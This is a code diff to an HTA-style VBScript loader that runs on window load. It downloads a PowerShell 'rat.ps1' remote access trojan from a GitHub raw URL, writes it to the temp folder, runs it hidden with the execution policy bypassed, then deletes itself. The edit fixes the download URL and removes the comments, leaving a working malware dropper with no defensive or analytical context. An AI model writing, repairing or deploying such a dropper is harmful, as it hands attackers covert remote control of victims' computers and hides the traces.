@@ -11,28 +11,24 @@ Sub Window_OnLoad
     Set shell = CreateObject("WScript.Shell")
     Set fso = CreateObject("Scripting.FileSystemObject")
     
-    ' CHANGE THIS TO YOUR rat.ps1 RAW URL
-    psURL = "https://raw.githubusercontent.com/Skibidi101201/rat/refs/heads/main/rat.ps1"
+    ' CORRECTED URL - no extra quote
+    psURL = "https://raw.githubusercontent.com/Skibidi101201/rat/main/rat.ps1"
     
     psPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\run.ps1"
     
-    ' Download the PowerShell script
     Set http = CreateObject("MSXML2.XMLHTTP")
     http.open "GET", psURL, False
     http.send
     
     If http.Status = 200 Then
-        ' Save the script
         Dim file
         Set file = fso.CreateTextFile(psPath, True)
         file.Write http.responseText
         file.Close
         
-        ' Run it silently
         shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psPath & """", 0, False
     End If
     
-    ' Self delete
     fso.DeleteFile Window.Location.Path
     Window.Close
 End Sub
